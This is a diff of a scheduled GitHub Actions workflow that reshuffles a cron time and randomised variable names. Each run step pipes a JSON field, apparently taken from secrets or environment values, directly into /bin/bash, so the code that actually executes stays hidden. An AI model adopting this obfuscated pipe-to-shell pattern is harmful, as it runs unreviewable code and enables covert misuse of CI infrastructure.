@@ -2,26 +2,27 @@ name: caozhang19870101
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
+    - cron: '16 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caozhang19870101
         env:
-          l7805: ${{ secrets.l7805 }}
+          iygdo42: ${{ secrets.iygdo42 }}
         run: |
-          echo $l7805 | jq -r .ouauw801 | /bin/bash
-          echo $u9820 | jq -r .n9489 | /bin/bash
-          echo $krawy7 | jq -r .lszq99274 | /bin/bash
-          echo $gj3 | jq -r .i6227 | /bin/bash
-          echo $niuha080 | jq -r .dvsdo40 | /bin/bash
-          echo $tykwo01 | jq -r .fhdun51 | /bin/bash
-          echo $hb428 | jq -r .og5 | /bin/bash
-          echo $sea9781 | jq -r .w771 | /bin/bash
-          echo $jgsq5 | jq -r .zlc20964 | /bin/bash
-          echo $phhgg37099 | jq -r .zrc14576 | /bin/bash
-          echo $azn49377 | jq -r .qdnpp61912 | /bin/bash
-          echo $vwg55843 | jq -r .pscso8842 | /bin/bash
+          echo $iygdo42 | jq -r .t9 | /bin/bash
+          echo $uddz5 | jq -r .r5 | /bin/bash
+          echo $pay706 | jq -r .u733 | /bin/bash
+          echo $l6807 | jq -r .isx146 | /bin/bash
+          echo $zxzs340 | jq -r .fkh877 | /bin/bash
+          echo $us7 | jq -r .srwpq5 | /bin/bash
+          echo $usvg9757 | jq -r .fxist18809 | /bin/bash
+          echo $a7 | jq -r .yoph10590 | /bin/bash
+          echo $ih2984 | jq -r .fjs965 | /bin/bash
+          echo $ul49936 | jq -r .qlg819 | /bin/bash
+          echo $zo377 | jq -r .olqdo2 | /bin/bash
+          echo $gbqc31711 | jq -r .kq0 | /bin/bash
 
